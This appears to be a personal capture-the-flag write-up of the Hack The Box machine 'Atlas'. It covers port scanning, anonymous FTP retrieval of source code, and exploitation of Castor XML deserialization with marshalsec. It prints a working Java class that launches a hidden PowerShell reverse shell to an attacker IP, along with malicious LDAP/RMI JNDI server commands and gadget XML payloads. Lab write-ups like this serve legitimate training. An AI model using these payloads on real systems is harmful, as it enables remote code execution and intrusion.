---
title: Atlas
date: 2026-02-14
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
lastmod: 2026-02-22T08:48:45.641Z
---
WW

# Box Info

Atlas is a Hard difficulty machine that demonstrates advanced exploitation techniques through Java deserialization vulnerabilities and .NET cryptographic analysis. The machine features a Spring Boot web application using the vulnerable Castor XML library for marshalling / un-marshalling operations, leading to remote code execution via Java RMI exploitation. Privilege escalation involves reverse engineering a .NET `WinSSHTerm` application, performing cryptographic analysis of AES-256-CBC encryption with PBKDF2-SHA1 key derivation, and recovering administrator credentials through password brute-forcing and dynamic debugging techniques.

***

# Recon 10.129.238.8

### \[\[PORT & IP SCAN]]

The `nmap` reveal that the machine is that allows the ftp anonymous login ,and show the ,atlas-pilot-1.0.0-SNAPSHOT.jar , atlas\_generator.zip , and the 3389 show the DNS with ATLAS, and the 8080 is running the tomcat .  with the windows a stand-alone machine.

```shell
──(root㉿kali)-[~/Desktop/HTB/Altas]
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.238.8 -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-14 13:46 +0800
Nmap scan report for 10.129.238.8
Host is up (0.12s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           FileZilla ftpd 1.7.2
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla.
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp        22851463 Jul 03  2023 atlas-pilot-1.0.0-SNAPSHOT.jar
|_-r--r--r-- 1 ftp ftp          586379 Jul 03  2023 atlas_generator.zip
| tls-alpn: 
|_  ftp
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=filezilla-server self signed certificate
| Not valid before: 2023-06-30T15:35:45
|_Not valid after:  2024-06-30T15:40:45
22/tcp   open  ssh           OpenSSH for_Windows_9.5 (protocol 2.0)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ATLAS
|   NetBIOS_Domain_Name: ATLAS
|   NetBIOS_Computer_Name: ATLAS
|   DNS_Domain_Name: ATLAS
|   DNS_Computer_Name: ATLAS
|   Product_Version: 10.0.19041
|_  System_Time: 2026-02-14T05:46:44+00:00
| ssl-cert: Subject: commonName=ATLAS
| Not valid before: 2025-10-08T22:02:25
|_Not valid after:  2026-04-09T22:02:25
|_ssl-date: 2026-02-14T05:46:48+00:00; 0s from scanner time.
8080/tcp open  http          Apache Tomcat (language: en)
|_http-title: Site doesn't have a title (text/html;charset=UTF-8).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.78 seconds
```

### \[\[FTP 21]]

Try the `anonymous` : `anonymous` , and we

```
	anonymous : anonymous
```

```shell
└─#  ftp 10.129.238.8
Connected to 10.129.238.8.
220-FileZilla Server 1.7.2
220 Please visit https://filezilla-project.org/
Name (10.129.238.8:root): anonymous
331 Please, specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||50335|)
150 Starting data transfer.
-r--r--r-- 1 ftp ftp        22851463 Jul 03  2023 atlas-pilot-1.0.0-SNAPSHOT.jar
-r--r--r-- 1 ftp ftp          586379 Jul 03  2023 atlas_generator.zip
226 Operation successful
ftp> get atlas_generator.zip
local: atlas_generator.zip remote: atlas_generator.zip
229 Entering Extended Passive Mode (|||50233|)
150 Starting data transfer.
100% |************************************************************************************************************************************************|   572 KiB    1.10 MiB/s    00:00 ETA
226 Operation successful
586379 bytes received in 00:00 (1.10 MiB/s)
ftp> get atlas-pilot-1.0.0-SNAPSHOT.jar
local: atlas-pilot-1.0.0-SNAPSHOT.jar remote: atlas-pilot-1.0.0-SNAPSHOT.jar
229 Entering Extended Passive Mode (|||50242|)
150 Starting data transfer.
100% |************************************************************************************************************************************************| 22315 KiB    1.28 MiB/s    00:00 ETA
226 Operation successful
22851463 bytes received in 00:16 (1.28 MiB/s)
ftp> exit
221 Goodbye.
                                                                                                                                                                                             
┌──(root㉿kali)-[~/Desktop/HTB/Altas]
└─# unzip atlas_generator.zip            
Archive:  atlas_generator.zip
   creating: .mvn/
   creating: .mvn/wrapper/
  inflating: .mvn/wrapper/maven-wrapper.jar  
  inflating: .mvn/wrapper/maven-wrapper.properties  
  inflating: build.gradle            
   creating: gradle/
  inflating: gradlew                 
  inflating: gradlew.bat             
   creating: gradle/wrapper/
  inflating: gradle/wrapper/gradle-wrapper.jar  
  inflating: gradle/wrapper/gradle-wrapper.properties  
  inflating: mvnw                    
  inflating: mvnw.cmd                
  inflating: pom.xml                 
 extracting: settings.gradle         
   creating: src/
   creating: src/main/
   creating: src/main/java/
   creating: src/main/java/com/
   creating: src/main/java/com/example/
   creating: src/main/java/com/example/uploadingfiles/
  inflating: src/main/java/com/example/uploadingfiles/Client.java  
  inflating: src/main/java/com/example/uploadingfiles/Employee.java  
  inflating: src/main/java/com/example/uploadingfiles/FileUploadController.java  
  inflating: src/main/java/com/example/uploadingfiles/UploadingFilesApplication.java  
   creating: src/main/resources/
  inflating: src/main/resources/application.properties  
   creating: src/main/resources/static/
  inflating: src/main/resources/static/59f86e9a43e6f89908a4f0b948915bef.png  
  inflating: src/main/resources/static/7363804265c4c8b8ca3f6e25a3e432c6.png  
  inflating: src/main/resources/static/e43471533678310ee5007162c051d5eb.png  
  inflating: src/main/resources/static/mapping.xml  
  inflating: src/main/resources/static/reset-fonts-grids.css  
  inflating: src/main/resources/static/resume.css  
  inflating: src/main/resources/static/rocket.png  
   creating: src/main/resources/templates/
  inflating: src/main/resources/templates/srt-resume.html  
  inflating: src/main/resources/templates/uploadForm.html  
  inflating: src/main/resources/templates/xmlTemplate.html  
                                                                                                                                                                                             
┌──(root㉿kali)-[~/Desktop/HTB/Altas]
└─# ls
atlas_generator.zip             build.gradle  gradlew      mvnw      openPort.txt  serviceScan.txt  spring-boot.txt
atlas-pilot-1.0.0-SNAPSHOT.jar  gradle        gradlew.bat  mvnw.cmd  pom.xml       settings.gradle  src

```

### Web Recon 80

![Pasted image 20260214135507.png](/ob/Pasted%20image%2020260214135507.png)

### \[\[WebSite Directory BurteForce]]

```
└─# feroxbuster -u http://10.129.238.8:8080/  -w ./spring-boot.txt 
                                                                                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.129.238.8:8080/
 🚩  In-Scope Url          │ 10.129.238.8
 🚀  Threads               │ 50
 📖  Wordlist              │ ./spring-boot.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      508l     1817w   141912c http://10.129.238.8:8080/e43471533678310ee5007162c051d5eb.png
200      GET      703l     4222w   342578c http://10.129.238.8:8080/rocket.png
200      GET      103l      159w     1634c http://10.129.238.8:8080/
[####################] - 6s       118/118     0s      found:0       errors:0      
[####################] - 6s       113/113     19/s    http://10.129.238.8:8080/                                                                                                                                                                                                                                                                                                           
┌──(root㉿kali)-[~/Desktop/HTB/Altas]
└─# 
```

### \[\[Exploit-CVE]]  & \[\[Default 404 Pages]]

Hide the version\
![Pasted image 20260214135656.png](/ob/Pasted%20image%2020260214135656.png)

### XML File upload observer

### ftp

zip source code review\
![Pasted image 20260214140546.png](/ob/Pasted%20image%2020260214140546.png)

observe the java file , to think out

pom.xml\
https://maven.apache.org/guides/introduction/introduction-to-the-pom.html\
![Pasted image 20260214140820.png](/ob/Pasted%20image%2020260214140820.png)

***

```
wget https://gist.githubusercontent.com/djangofan/3186223/raw/ee3840f937e745d5683b046a85cc4a0337e18428/test.xml 
```

```
at FileUploadController.java
package com.example.uploadingfiles;

import java.io.IOException;
import java.util.stream.Collectors;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.core.io.Resource;
import org.springframework.http.HttpHeaders;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.web.bind.annotation.ExceptionHandler;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.servlet.mvc.method.annotation.MvcUriComponentsBuilder;
import org.springframework.web.servlet.mvc.support.RedirectAttributes;
import com.example.uploadingfiles.Client;
import com.example.uploadingfiles.Employee;

@Controller
public class FileUploadController {


        @GetMapping("/")
        public String listUploadedFiles(Model model) throws IOException {

                return "uploadForm";
        }

        @GetMapping("/generateTemplate")
        public String writeMarshall(Model model) throws IOException {
                model.addAttribute("message", Client.createXML());
                return "xmlTemplate";
        }


        @PostMapping("/")
        public String handleFileUpload(@RequestParam("file") MultipartFile file,
                        RedirectAttributes redirectAttributes, Model model) {

                try {
                        Employee person = Client.parseXML(file.getInputStream());
                        model.addAttribute("name", person.getName());
                        model.addAttribute("id", person.getId());
                        model.addAttribute("email", person.getEmail());
                        model.addAttribute("phone", person.getPhone());
                        model.addAttribute("profile", person.getProfile());
                        model.addAttribute("title", person.getTitle());
                        model.addAttribute("skills", person.getSkills());
                        model.addAttribute("educationTitle", person.getEducationTitle());
                        model.addAttribute("educationText", person.getEducationText());
                        model.addAttribute("talentTitle1", person.getTalentTitles()[0]);
                        model.addAttribute("talentTitle2", person.getTalentTitles()[1]);
                        model.addAttribute("talentTitle3", person.getTalentTitles()[2]);
                        model.addAttribute("talentText1", person.getTalentTextes()[0]);
                        model.addAttribute("talentText2", person.getTalentTextes()[1]);
                        model.addAttribute("talentText3", person.getTalentTextes()[2]);
                        model.addAttribute("message", person.getMessage());

                } catch (Exception e) {
                        e.printStackTrace();
                }

                return "srt-resume";
        }

}

```

![Pasted image 20260214142239.png](/ob/Pasted%20image%2020260214142239.png)

![Pasted image 20260214143153.png](/ob/Pasted%20image%2020260214143153.png)

![Pasted image 20260214142445.png](/ob/Pasted%20image%2020260214142445.png)

![Pasted image 20260214142511.png](/ob/Pasted%20image%2020260214142511.png)

![Pasted image 20260214142637.png](/ob/Pasted%20image%2020260214142637.png)

Reference for  marshallers unmarshaller  https://blog.csdn.net/qq496013218/article/details/74204782

poc github : https://github.com/mbechler/marshalsec

![Pasted image 20260214143130.png](/ob/Pasted%20image%2020260214143130.png)

***

```
┌──(root㉿kali)-[~/Desktop/HTB/Altas]
└─# vim Dockerfile        
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop/HTB/Altas]
└─# cat Dockerfile 
FROM maven:3.9.9-eclipse-temurin-8

WORKDIR /opt/marshalsec

# 移除網址前後的 < > 
RUN git clone https://github.com/mbechler/marshalsec.git .

RUN mvn clean package -DskipTests

```

```
sudo docker build -t marshalsec-java8 .
```

![Pasted image 20260214153200.png](/ob/Pasted%20image%2020260214153200.png)

```
sudo docker run -it --rm -p 1389:1389 marshalsec-java8 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Castor
```

![Pasted image 20260214153420.png](/ob/Pasted%20image%2020260214153420.png)

```
No gadget type specified, available are [SpringAbstractBeanFactoryPointcutAdvisor, C3P0WrapperConnPool]
```

```
sudo docker run -it --rm -p 1389:1389 marshalsec-java8 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.14.17:8000/#Exploit"
```

Create the exploit XML

`Exploit.java`

```
public class Exploit {
    public Exploit() {}
    
    static {
        try {
            // 將 PowerShell 的指令主體獨立出來，避免引號跳脫混亂
            String payload = "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.17',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}";
            
            // 使用陣列形式，讓 Java 精準識別執行檔與各個參數
            String[] cmd = {
                "powershell", 
                "-NoP", 
                "-NonI", 
                "-W", "Hidden", 
                "-Exec", "Bypass", 
                "-Command", payload
            };
            
            java.lang.Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    // 加入 main 方法方便本機除錯測試 (非必要，但建議保留)
    public static void main(String[] args) {
        Exploit e = new Exploit();
    }
}
```

請在您存放 `Exploit.java` 的目錄下，直接執行以下這行 Docker 指令。它會啟動一個臨時容器，把您當前的目錄掛載進去，編譯完畢後自動銷毀容器，不留痕跡：

```
sudo docker run --rm -v $(pwd):/app -w /app marshalsec-java8 javac -source 1.8 -target 1.8 Exploit.java
```

### java marshallers deserialization

{{< toggle "Tag 🏷️" >}}

{{< tag "java\_xml\_marshallers\_deserialization" >}} In the source code review , found the marshallers package which is used for the deserializing XML data into newly created Java content trees , so we abuse the marshallers of deserialization for the xml upload function to ping myself as the POC , Finally the RCE

{{< /toggle >}}

Step 1 build the docker for marshalsec\
Use the https://github.com/mbechler/marshalsec as the docker to run for avoiding the env setting problem

```
┌──(root㉿kali)-[~/Desktop/HTB/Altas]
└─# vim Dockerfile        
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop/HTB/Altas]
└─# cat Dockerfile 
FROM maven:3.9.9-eclipse-temurin-8

WORKDIR /opt/marshalsec

# 移除網址前後的 < > 
RUN git clone https://github.com/mbechler/marshalsec.git .

RUN mvn clean package -DskipTests

```

```
sudo docker build -t marshalsec-java8 .
```

![Pasted image 20260214153200.png](/ob/Pasted%20image%2020260214153200.png)

step 2 define a LDAP server for

```
sudo docker run -it --rm -p 1389:1389 marshalsec-java8 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Castor SpringAbstractBeanFactoryPointcutAdvisor ldap://10.10.14.17:1389/a
```

which will give the payload

```
<x xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:java="http://java.sun.com" xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean"><target-bean-name>ldap://10.10.14.17:1389/a</target-bean-name><property-path>foo</property-path><bean-factory xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory"><shareable-resource>ldap://10.10.14.17:1389/a</shareable-resource></bean-factory></x>
                                                                                              
```

![Pasted image 20260214160551.png](/ob/Pasted%20image%2020260214160551.png)

we also start a malicious JNDI / LDAP server via marschalsec

```
sudo docker run -it --rm -p 1389:1389 marshalsec-java8 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://10.10.14.17:8888/#Exploit"
```

create the `Exploit.java`

```
public class Exploit {
    public Exploit() {}
    
    static {
        try {
            // 將 PowerShell 的指令主體獨立出來，避免引號跳脫混亂
            String payload = "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.17',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}";
            
            // 使用陣列形式，讓 Java 精準識別執行檔與各個參數
            String[] cmd = {
                "powershell", 
                "-NoP", 
                "-NonI", 
                "-W", "Hidden", 
                "-Exec", "Bypass", 
                "-Command", payload
            };
            
            java.lang.Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    // 加入 main 方法方便本機除錯測試 (非必要，但建議保留)
    public static void main(String[] args) {
        Exploit e = new Exploit();
    }
}

```

```
sudo docker run --rm -v $(pwd):/app -w /app marshalsec-java8 javac -source 1.8 -target 1.8 Exploit.java
```

***

我們會用 RMI 方案重新生成 SSRF 有效載荷，並在生成的範本中重新替換。

```
sudo docker run -it --rm -p 1389:1389 marshalsec-java8 java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.Castor SpringAbstractBeanFactoryPointcutAdvisor rmi://10.10.14.17/a
```

```
<x xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:java="http://java.sun.com" xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean"><target-bean-name>rmi://10.10.14.17/a</target-bean-name><property-path>foo</property-path><bean-factory xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory"><shareable-resource>rmi://10.10.14.17/a</shareable-resource></bean-factory></x>

```

```
java -cp target/ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsBeanutils1 'ping 10.10.17.46'
* Opening JRMP listener on 1099
```

***

try more one

```
<x xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:java="http://java.sun.com" xsi:type="java:org.springframework.beans.factory.config.PropertyPathFactoryBean"><target-bean-name>ldap://10.10.14.17:1389</target-bean-name><property-path>foo</property-path><bean-factory xsi:type="java:org.springframework.jndi.support.SimpleJndiBeanFactory"><shareable-resource>ldap://10.10.14.17:1389</shareable-resource></bean-factory></x>

```
